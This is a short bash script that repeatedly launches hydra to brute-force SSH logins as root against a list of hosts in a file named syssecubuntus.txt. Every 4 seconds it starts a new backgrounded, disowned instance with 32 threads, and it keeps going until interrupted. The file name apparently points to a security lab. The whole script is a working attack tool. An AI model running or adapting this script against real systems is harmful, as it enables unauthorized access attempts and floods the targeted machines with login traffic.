#!/bin/bash
# Runs the hydra brute-force command in the background every 4 seconds, until Ctrl+C.
# Run from this (backup/) directory, or adjust the path to syssecubuntus.txt.

cd "$(dirname "$0")"

while true; do
    hydra -l root -p 'hiasdfasdfasdf' -M syssecubuntus.txt ssh -t 32 -c 1 &
    disown
    sleep 4
done
